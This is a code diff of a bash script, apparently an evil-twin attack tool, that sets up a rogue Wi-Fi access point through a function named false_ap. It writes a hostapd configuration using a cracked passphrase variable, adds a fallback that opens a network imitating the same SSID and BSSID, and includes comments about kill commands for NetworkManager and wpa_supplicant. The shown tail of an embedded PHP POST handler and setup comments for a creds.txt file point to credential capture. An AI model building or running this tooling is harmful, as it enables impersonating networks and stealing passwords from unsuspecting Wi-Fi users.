@@ -11,7 +11,7 @@ AUTH_VAR="PSK"
 BEACONS_VAR=""
 ESSID_VAR="PI_WIFI_TEST"
 
-PASSWORD_cracked="A123456789a!"
+PASSWORD_CRACKED="A123456789a!"
 
 
 FILE_isc="isc-dhcp-server"
@@ -177,12 +177,22 @@ hw_mode=g
 channel=$CHANNEL_VAR
 macaddr_acl=0
 auth_algs=1
+EOF
+
+if [ -n "$PASSWORD_CRACKED" ] && [ "$WPA" -gt 0 ]; then
+    cat <<EOF >> hostapd.conf
 wpa=$WPA
-wpa_passphrase=$PASSWORD_cracked
+wpa_passphrase=$PASSWORD_CRACKED
 wpa_key_mgmt=$WPA_KEY_MGMT
 rsn_pairwise=$RSN_PAIRWISE
-
 EOF
+else
+    # Forzar red abierta manteniendo el mismo SSID y BSSID
+    cat <<EOF >> hostapd.conf
+wpa=0
+ignore_broadcast_ssid=0
+EOF
+fi
 
     echo "Done hostapd.conf Correctly."
    
@@ -193,6 +203,12 @@ EOF
     #En caso que el usuario tenga ya una ip en la interfaz wifi
     sudo ip addr flush dev wlan0
     sudo ip addr add 192.168.1.1/24 dev $SELECTED_INTERFACE
+
+    #Puede tener conflictos con hostapd
+    #sudo systemctl stop NetworkManager 
+    #sudo systemctl stop wpa_supplicant 
+    #sudo airmon-ng check kill
+
     if ! activate_dhcp; then 
         echo "Error"
         exit 1
@@ -298,7 +314,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 }
 ?>
 EOF
-
+}
 
 #┌──(edusagnier㉿interceptor)-[/var/www/html]
 #└─$ touch creds.txt
@@ -309,7 +325,7 @@ EOF
 #┌──(edusagnier㉿interceptor)-[/var/www/html]
 #└─$ sudo chown www-data creds.txt    
 
-}
+
 
 false_ap
 trap cleanup EXIT
